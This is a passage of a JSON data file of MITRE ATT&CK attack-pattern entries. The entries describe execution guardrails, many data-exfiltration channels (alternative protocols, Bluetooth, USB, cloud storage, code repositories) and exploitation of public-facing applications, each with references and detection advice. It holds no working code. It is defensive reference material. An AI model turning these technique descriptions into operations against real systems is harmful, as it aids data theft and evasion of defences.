be used for persistence.\",\"external_references\":[{\"external_id\":\"T1574.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574/005\"},{\"description\":\"Robert Kugler. (2012, November 20). Mozilla Foundation Security Advisory 2012-98. Retrieved March 10, 2017.\",\"source_name\":\"mozilla_sec_adv_2012\",\"url\":\"https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/\"},{\"description\":\"Stefan Kanthak. (2015, December 8). Executable installers are vulnerable^WEVIL (case 7): 7z*.exe allows remote code execution with escalation of privilege. Retrieved December 4, 2014.\",\"source_name\":\"Executable Installers are Vulnerable\",\"url\":\"https://seclists.org/fulldisclosure/2015/Dec/34\"}],\"id\":\"attack-pattern--70d81154-b187-45f9-8ec5-295d01255979\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-26T19:20:23.030Z\",\"name\":\"Executable Installer File Permissions Weakness\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Travis Smith, Tripwire\",\"Stefan Kanthak\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"File monitoring\"],\"x_mitre_detection\":\"Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\\n\\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.\",\"x_mitre_effective_permissions\":[\"Administrator\",\"User\",\"SYSTEM\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-01-31T02:10:08.261Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)\\n\\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.\",\"external_references\":[{\"external_id\":\"T1480\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1480\"},{\"description\":\"Shoorbajee, Z. (2018, June 1). Playing nice? FireEye CEO says U.S. malware is more restrained than adversaries\'. Retrieved January 17, 2019.\",\"source_name\":\"FireEye Kevin Mandia Guardrails\",\"url\":\"https://www.cyberscoop.com/kevin-mandia-fireeye-u-s-malware-nice/\"},{\"description\":\"McWhirt, M., Carr, N., Bienstock, D. (2019, December 4). Breaking the Rules: A Tough Outlook for Home Page Attacks (CVE-2017-11774). Retrieved June 23, 2020.\",\"source_name\":\"FireEye Outlook Dec 2019\",\"url\":\"https://www.fireeye.com/blog/threat-research/2019/12/breaking-the-rules-tough-outlook-for-home-page-attacks.html\"}],\"id\":\"attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-24T18:52:12.956Z\",\"name\":\"Execution Guardrails\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Nick Carr, FireEye\"],\"x_mitre_data_sources\":[\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Host forensic analysis\",\"Signature-based detection\",\"Static file analysis\"],\"x_mitre_detection\":\"Detecting the use of guardrails may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:30:44.720Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \\n\\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \\n\\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) \",\"external_references\":[{\"external_id\":\"T1048\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1048\"},{\"description\":\"Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017.\",\"source_name\":\"Palo Alto OilRig Oct 2016\",\"url\":\"http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T00:50:31.548Z\",\"name\":\"Exfiltration Over Alternative Protocol\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Alfredo Abarca\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Process use of network\",\"Packet capture\",\"Netflow/Enclave netflow\",\"Network protocol analysis\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2020-03-15T15:34:30.767Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \\n\\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \\n\\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. \",\"external_references\":[{\"external_id\":\"T1048.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1048/002\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T00:45:51.014Z\",\"name\":\"Exfiltration Over Asymmetric Encrypted Non-C2 Protocol\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Network protocol analysis\",\"Netflow/Enclave netflow\",\"Packet capture\",\"Process use of network\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) \",\"x_mitre_is_subtechnique\":true,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-09T17:07:57.392Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an attacker may opt to exfiltrate data using a Bluetooth communication channel.\\n\\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.\",\"external_references\":[{\"external_id\":\"T1011.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1011/001\"}],\"id\":\"attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T00:34:55.439Z\",\"name\":\"Exfiltration Over Bluetooth\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"User interface\"],\"x_mitre_detection\":\"Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.\\n\\nMonitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:41.804Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.\",\"external_references\":[{\"external_id\":\"T1041\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1041\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-12T15:59:47.470Z\",\"name\":\"Exfiltration Over C2 Channel\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Process use of network\",\"Netflow/Enclave netflow\",\"Process monitoring\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2017-05-31T21:30:25.159Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.\\n\\nAdversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network\",\"external_references\":[{\"external_id\":\"T1011\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1011\"}],\"id\":\"attack-pattern--51ea26b1-ff1e-4faa-b1a0-1114cd298c87\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T00:35:24.570Z\",\"name\":\"Exfiltration Over Other Network Medium\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Itzik Kotler, SafeBreach\"],\"x_mitre_data_sources\":[\"User interface\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.\\n\\nMonitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:30:46.461Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.\",\"external_references\":[{\"external_id\":\"T1052\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1052\"}],\"id\":\"attack-pattern--e6415f09-df0e-48de-9aba-928c902b7549\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T00:31:48.713Z\",\"name\":\"Exfiltration Over Physical Medium\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Data loss prevention\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor file access on removable media. Detect processes that execute when removable media are mounted.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"Presence of physical medium or device\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-03-15T15:30:42.378Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \\n\\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \\n\\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). \",\"external_references\":[{\"external_id\":\"T1048.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1048/001\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--79a4052e-1a89-4b09-aea6-51f1d11fe19c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T00:43:24.228Z\",\"name\":\"Exfiltration Over Symmetric Encrypted Non-C2 Protocol\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Malware reverse engineering\",\"Network protocol analysis\",\"Netflow/Enclave netflow\",\"Packet capture\",\"Process use of network\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) \\n\\nArtifacts and evidence of symmetric key exchange may be recoverable by analyzing network traffic or looking for hard-coded values within malware. If recovered, these keys can be used to decrypt network data from command and control channels. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-15T15:37:47.583Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \\n\\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. \",\"external_references\":[{\"external_id\":\"T1048.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1048/003\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T00:50:31.361Z\",\"name\":\"Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Network protocol analysis\",\"Netflow/Enclave netflow\",\"Packet capture\",\"Process use of network\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) \",\"x_mitre_is_subtechnique\":true,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-09T12:51:45.570Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\\n\\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.\",\"external_references\":[{\"external_id\":\"T1567\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1567\"}],\"id\":\"attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T01:02:24.276Z\",\"name\":\"Exfiltration Over Web Service\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process use of network\",\"Packet capture\",\"Netflow/Enclave netflow\",\"Network protocol analysis\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-11T13:50:11.467Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.\",\"external_references\":[{\"external_id\":\"T1052.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1052/001\"}],\"id\":\"attack-pattern--a3e1e6c5-9c74-4fc0-a16c-a9d228c17829\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T00:31:02.204Z\",\"name\":\"Exfiltration over USB\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Data loss prevention\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor file access on removable media. Detect processes that execute when removable media are mounted.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"Presence of physical medium or device\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-09T15:04:32.767Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\\n\\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. \",\"external_references\":[{\"external_id\":\"T1567.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1567/002\"}],\"id\":\"attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T01:02:24.172Z\",\"name\":\"Exfiltration to Cloud Storage\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process use of network\",\"Packet capture\",\"Netflow/Enclave netflow\",\"Network protocol analysis\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-09T14:51:11.772Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\\n\\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. \",\"external_references\":[{\"external_id\":\"T1567.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1567/001\"}],\"id\":\"attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T00:58:55.433Z\",\"name\":\"Exfiltration to Code Repository\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process use of network\",\"Packet capture\",\"Netflow/Enclave netflow\",\"Network protocol analysis\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)(Citation: NVD CVE-2016-6662), standard services (like SMB(Citation: CIS Multiple SMB Vulnerabilities) or SSH), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211).\\n\\nIf an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow an adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies.\\n\\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)\",\"external_references\":[{\"external_id\":\"T1190\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1190\"},{\"description\":\"National Vulnerability Database. (2017, February 2). CVE-2016-6662 Detail. Retrieved April 3, 2018.\",\"source_name\":\"NVD CVE-2016-6662\",\"url\":\"https://nvd.nist.gov/vuln/detail/CVE-2016-6662\"},{\"description\":\"CIS. (2017, May 15). Multiple Vulnerabilities in Microsoft Windows SMB Server Could Allow for Remote Code Execution. Retrieved April 3, 2018.\",\"source_name\":\"CIS Multiple SMB Vulnerabilities\",\"url\":\"https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/\"},{\"description\":\"National Vulnerability Database. (2017, September 24). CVE-2014-7169 Detail. Retrieved April 3, 2018.\",\"source_name\":\"NVD CVE-2014-7169\",\"url\":\"https://nvd.nist.gov/vuln/detail/CVE-2014-7169\"},{\"description\":\"OWASP. (2018, February 23). OWASP Top Ten Project. Retrieved April 3, 2018.\",\"source_name\":\"OWASP Top 10\",\"url\":\"https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\"},{\"description\":\"Christey, S., Brown, M., Kirby, D., Martin, B., Paller, A.. (2011, September 13). 2011 CWE/SANS Top 25 Most Dangerous Software Errors. Retrieved April 10, 2019.\",\"source_name\":\"CWE top 25\",\"url\":\"https://cwe.mitre.org/top25/index.html\"}],\"id\":\"attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-02-18T16:10:38.866Z\",\"name\":\"Exploit Public-Facing Application\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Azure activity logs\",\"AWS CloudTrail logs\",\"Stackdriver logs\",\"Packet capture\",\"Web logs\",\"Web application firewall logs\",\"Application logs\"],\"x_mitre_detection\":\"Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\",\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"2.1\"}",
